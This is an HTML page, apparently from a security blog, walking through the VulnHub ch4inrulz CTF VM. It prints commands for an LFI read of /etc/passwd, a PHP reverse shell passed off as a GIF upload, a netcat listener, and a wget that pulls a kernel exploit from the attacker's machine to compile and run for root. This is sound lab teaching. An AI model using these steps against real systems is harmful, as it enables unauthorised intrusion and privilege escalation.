@@ -1,0 +1,114 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Hack the ch4inrulz: 1.0.1 (CTF Challenge)</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-ch4inrulz-1-0-1-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2018-08-12T16:35:31+00:00">August 12, 2018</time><time class="updated" datetime="2025-06-10T20:29:38+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Hello readers and welcome to another CTF challenge. This VM is made by Frank Tope as you’ll see on the very homepage on the server’s website (his resume). Nice touch, if I might add. Anyhow, you can download this VM from vulnhub <a style="color: #000000;" href="https://www.vulnhub.com/entry/ch4inrulz-101,247/"><span style="color: #0000ff;">here</span></a>. The aim of this lab is to get root and read the congratulatory message written in the flag.</span></p>
+<p><span style="color: #000000;">I would rate the difficulty level of this lab to be <strong>intermediate. </strong>Although, there were no buffer overflows or unnecessary exploit development, yet it did make us think a little.</span></p>
+<p><strong><span style="color: #000000;">Steps Involved:</span></strong></p>
+<ol>
+<li><span style="color: #000000;">Port Scanning and IP clutching.</span></li>
+<li><span style="color: #000000;">Directory busting port 80.</span></li>
+<li><span style="color: #000000;">Directory busting port 8011.</span></li>
+<li><span style="color: #000000;">Discovering LFI vulnerability.</span></li>
+<li><span style="color: #000000;">Discovering an HTML backup file.</span></li>
+<li><span style="color: #000000;">Cracking password hash</span></li>
+<li><span style="color: #000000;">Logging in /development</span></li>
+<li><span style="color: #000000;">Uploading a PHP shell disguised as GIF file.</span></li>
+<li><span style="color: #000000;">Bypassing the check and triggering the file to get a netcat shell.</span></li>
+<li><span style="color: #000000;">Privilege escalation to get the flag.</span></li>
+</ol>
+<p><span style="color: #000000;">Alright then, let’s head into the VM all the way in.</span></p>
+<p><span style="color: #000000;">The first step is as always, running <strong>netdiscover </strong>on the VM to grab the IP address. In my case, the IP was <strong>192.168.1.103.</strong></span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-Di-JzPjOMVM/W3BdM-5LdsI/AAAAAAAAZsw/wdsdZ_02m0Qnk-Jx4Mxy45Jp-fFtHw7xwCLcBGAs/s1600/1.png"/></strong></span></p>
+<p><span style="color: #000000;">Once the IP was found, we ran <strong>nmap</strong> aggressive scan to enumerate all the open ports.</span></p>
+<p><img decoding="async" src="https://3.bp.blogspot.com/-LHjyi99d5kU/W3BdOubZNoI/AAAAAAAAZtY/2KKQwSc6SbQQBQIJot0q1Fo9LCB1vDscQCLcBGAs/s1600/2.png"/></p>
+<p><span style="color: #000000;">What was there to wait for after we saw port 80 open! We headed straight into the browser and a webpage got displayed which looked like a single page resume.</span></p>
+<p><img decoding="async" src="https://4.bp.blogspot.com/-7vxY2LOKxT0/W3BdQThldpI/AAAAAAAAZt8/HOa3v5hhIRYafoLY5et6-8FbXiyHxAOtQCLcBGAs/s1600/3.png"/></p>
+<p><span style="color: #000000;">After not finding much, we chose to run directory buster <strong>dirb.</strong></span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/--dflh0la8oc/W3BdQiR--VI/AAAAAAAAZuE/bKJqgaXuh6YbXOVZL1r2NFRyZONrSA1cwCLcBGAs/s1600/5.png"/></strong></span></p>
+<p><span style="color: #000000;">robots.txt seemed interesting at first but it had nothing at all. Another directory was <strong>/development. </strong>It looked like a testing site since it asked for the authentication.</span></p>
+<p><img decoding="async" src="https://4.bp.blogspot.com/-5hWhnish0lA/W3BdQkDCNeI/AAAAAAAAZuA/Ubvl5WsQh74W9VS36MnK82UR3JiPsxnYwCLcBGAs/s1600/6.png"/></p>
+<p><span style="color: #000000;">We then chose to look into port 8011, after finding not much of the info. It looked like a backend to the development directory.</span></p>
+<p><img decoding="async" src="https://4.bp.blogspot.com/-C_nkXJGjUu0/W3BdQ0G2x4I/AAAAAAAAZuI/mIpMKxl_8S8T9mriVItQv1FkijmDQR-LACLcBGAs/s1600/7.png"/></p>
+<p><span style="color: #000000;">We ran one more <strong>dirb </strong>scan on this port.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-c6WCBBMrW5g/W3BdRUmWfiI/AAAAAAAAZuM/WFWwDSuQxKoA-KtwEJzBbGhErPJQMIs1wCLcBGAs/s1600/8.png"/></p>
+<p><span style="color: #000000;">We found an interesting directory called <strong>/api. </strong></span><span style="color: #000000;">We opened it in the browser immediately.</span></p>
+<p><img decoding="async" src="https://4.bp.blogspot.com/-evWYLdtyBYA/W3BdRnUjyLI/AAAAAAAAZuQ/sF0HKh7ZbGASwM7a2Klbsh8XG3k7kUA8QCLcBGAs/s1600/9.png"/></p>
+<p><span style="color: #000000;">We modified the URL parameter to /api/&lt;api-name&gt; but only one API seemed to be working and that was </span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://3.bp.blogspot.com/-xSu6WUIOmxw/W3BdM_mwY7I/AAAAAAAAZs0/nb6Z1rmj1bcEsTniCGYdv9hBdaroAVZ1gCLcBGAs/s1600/10.png"/></strong></span></p>
+<p><span style="color: #000000;">A message said, “no parameter called file passed to me.” It gave us a hint that we had to pass a parameter called file.</span></p>
+<pre class="lang:default decode:true">192.168.1.103:8011/api/files_api.php?file=/etc/passwd</pre>
+<p><img decoding="async" src="https://3.bp.blogspot.com/-JpiFqOcT69E/W3BdM4IqlrI/AAAAAAAAZs4/z3bKeqvlS64gHia9YZrvKnsQXHACEjy0ACLcBGAs/s1600/11.png"/></p>
+<p><span style="color: #000000;">HAHA. They got us. But still, there was another thing left to try—bypassing parameter through curl.</span></p>
+<pre class="lang:default decode:true ">curl -X POST -d "file=/etc/passwd" http://192.168.1.103:8011/api/files_api.php</pre>
+<p><span style="color: #000000;">As you can see, LFI is present here!</span></p>
+<p><span style="color: #000000;"><strong><img decoding="async" src="https://4.bp.blogspot.com/-b_QBfUECbBI/W3BdNUzykzI/AAAAAAAAZs8/48hagVLJCMkOyGFT7iU7dXJI1PT5QC4LACLcBGAs/s1600/12.png"/></strong></span></p>
+<p><span style="color: #000000;">Now, we tried some methods, put our hands here and there but nothing worked with this LFI.</span></p>
+<p><span style="color: #000000;">Meanwhile, another thing that got our attention was the development server. You had a development site, you have a development server, and hence there would be more than one <strong>html</strong> files or copies of html files <strong>(backups).</strong></span></p>
+<p><span style="color: #000000;">One such common file is <strong>index.html.bak</strong></span></p>
+<p><span style="color: #000000;">It was an arrow in the dark but it hit the bullseye!</span></p>
+<p><img decoding="async" src="https://2.bp.blogspot.com/-aBvbujV6JNY/W3BdNuyrqeI/AAAAAAAAZtE/0e78V7TG-RsUuccaKcmlT-faBBN_3---ACLcBGAs/s1600/14.png"/></p>
+<p><span style="color: #000000;">We saved it and read it using <strong>cat </strong>utility.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-YxNcr5zBoXI/W3BdNV3fiGI/AAAAAAAAZtA/PN6c6Jy_gfAXtfNowE0kF80h4l8dXrK8gCLcBGAs/s1600/15.png"/></p>
+<p><span style="color: #000000;">It had a password hash! </span><span style="color: #000000;">It took us no time to copy this in a text file called <strong>hash.txt </strong>and run John the Ripper on it.</span></p>
+<p><img decoding="async" src="https://2.bp.blogspot.com/-nlbyvX5OJfE/W3BdN4nS_BI/AAAAAAAAZtM/781fW7hvkOAmaQvok5nh3hHU1lU4KW0ZwCLcBGAs/s1600/17.png"/></p>
+<p><span style="color: #000000;">It surely was the credentials to <strong>/development </strong>authentication.</span></p>
+<p><span style="color: #000000;"><strong>frank:frank!!!!</strong></span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://3.bp.blogspot.com/-IyHuSJIiRag/W3BdOF0fUTI/AAAAAAAAZtQ/WR1EBzP1x38iiG33TRT1KlqG3DMrHyWqwCLcBGAs/s1600/18.png"/></strong></span></p>
+<p><span style="color: #000000;">And it opened up like a beautiful treasure!</span></p>
+<p><img decoding="async" src="https://3.bp.blogspot.com/-BbHhjDUT08E/W3BdOQ2sfWI/AAAAAAAAZtU/DYz39YYQ7MI7lvySt5iQDYqgvMXb0IU1QCLcBGAs/s1600/19.png"/></p>
+<p><span style="color: #000000;">The message on this page said that the uploader tool was only half completed. So, we went to /uploader directory</span></p>
+<p><img decoding="async" src="https://2.bp.blogspot.com/-pBK5vU_tIOA/W3BdOvmPL7I/AAAAAAAAZtc/zTaoLufmit4l3AZKyPSeM2CHltdN0KrwQCLcBGAs/s1600/20.png"/></p>
+<p><span style="color: #000000;">The uploader had a security check for images only (jpg, png, gif) and a size limitation too.</span></p>
+<p><span style="color: #000000;">So, here is what we did.</span></p>
+<p><span style="color: #000000;">Traverse to the directory: <strong>/usr/share/webshells/php/php-reverse-shell.php</strong></span></p>
+<p><span style="color: #000000;">Open it with a text editor and add GIF98 in the first line and save this file as <strong>shell.gif</strong></span></p>
+<p><img decoding="async" src="https://3.bp.blogspot.com/-z8nh9F7VrZw/W3BdO09xlAI/AAAAAAAAZtg/EpToTuHKnO0SyPu3DJYpsGx0n1TAtQOWgCLcBGAs/s1600/21.png"/></p>
+<p><span style="color: #000000;">Now, what this will do is that it will trick the uploader in believing the file is GIF when in reality, it is a PHP reverse shell.</span></p>
+<p><span style="color: #000000;">So, we upload shell.gif using the uploader and the following message was received.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-LiZEXlGk4eg/W3BdPSmdQJI/AAAAAAAAZtk/3t3r5tW68fEeZO2cjgfzhoSfI3Uvs2m3wCLcBGAs/s1600/22.png"/></p>
+<p> </p>
+<p><span style="color: #000000;">Now, the author said the file was uploaded to his uploads path. Let’s get a little perspective here.</span></p>
+<p><span style="color: #000000;">Website’s name: Frank’s website</span></p>
+<p><span style="color: #000000;">Uploader’s name: Frank uploader.</span></p>
+<p><span style="color: #000000;">First message on the website: I love patterns</span></p>
+<p><span style="color: #000000;">It took a while for us but we guessed it in the end, the upload’s directory would be named Frank uploads.</span></p>
+<p><span style="color: #000000;">We tried many permutations for this directory like Frankupload, frankUploads, franksuploads etc. but the one that seemed to hit was <strong>FRANKuploads.</strong></span></p>
+<p><span style="color: #000000;">This step was tedious and time-consuming as there was no straight connection from anywhere to this directory.</span></p>
+<p><img decoding="async" src="https://2.bp.blogspot.com/--zqFQ1DrjXw/W3BdPkHzHTI/AAAAAAAAZto/FoC8gkvshMIfZctBvtKFzgLKOYCQx5mWACLcBGAs/s1600/23.png"/></p>
+<p><span style="color: #000000;">Now, all was left to trigger this file. </span><span style="color: #000000;">We know for a fact that double-clicking won’t do us any good so we used <strong>curl </strong>once again to get a shell.</span></p>
+<p><span style="color: #000000;">We activated netcat on a terminal side by side and typed this following curl command:</span></p>
+<pre class="lang:default decode:true">curl –X POST –d "file=/var/www/development/uploader/FRANKuploads/shell.gif" http://192.168.1.103:8011/api/files_api.php</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://3.bp.blogspot.com/-6zZPdx3LV0M/W3BdPp78TcI/AAAAAAAAZts/SLxW1UqK6rgtz8FmXBr4RB-WnfdmUyYBACLcBGAs/s1600/24.png"/></strong></span></p>
+<p><span style="color: #000000;">On another terminal, we had activated netcat:</span></p>
+<p><span style="color: #000000;">As soon as curl triggered the LFI vulnerability and requested for shell.gif, we got a netcat session!</span></p>
+<pre class="lang:default decode:true">nc -lvp 1234
+python -c 'import pty;pty.spawn("/bin/bash");' 
+uname -a</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://3.bp.blogspot.com/-hgedKyaEsow/W3BdP7ZhrEI/AAAAAAAAZtw/EdUeB4jtJ74rAABYQPRcaRt7RiSOMbApQCLcBGAs/s1600/25.png"/></strong></span></p>
+<p><span style="color: #000000;">After a bit of surfing, we found a Linux Kernel exploit for version 2.6</span></p>
+<pre class="lang:default decode:true">searchsploit 15285
+cd Desktop
+cp /usr/share/exploitdb/exploits/linux/local/15285.c  .
+python -m SimpleHTTPServer 80</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://2.bp.blogspot.com/-mLYB_ViVH6k/W3BdQCD9UJI/AAAAAAAAZt0/o_Ukn6xjcYM3-in9RzG_D5UpBV3Q1jC2ACLcBGAs/s1600/26.png"/></strong></span></p>
+<p><span style="color: #000000;">On our VM shell, we downloaded this exploit, compiled it and ran it to get root!</span></p>
+<pre class="lang:default decode:true">cd tmp
+wget http://192.168.1.107/15285.c
+gcc 15285.c -o 15285
+chmod 777 15285
+./15285</pre>
+<p><strong>Voila! We got root!</strong></p>
+<pre class="lang:default decode:true ">cd root
+ls
+cat root.txt</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://3.bp.blogspot.com/-7cQLcmdTLGE/W3BdQCjRO7I/AAAAAAAAZt4/JIihQ9_gmf0BmpPK1R-e5m8DtBElIqTBACLcBGAs/s1600/27.png"/></strong></span></p>
+<p><span style="color: #000000;">And there it was, the flag. Hope you enjoyed because we sure did!</span></p>
+<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and a left and right brain thinker. contac</span>t<strong> <a class="broken_link" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
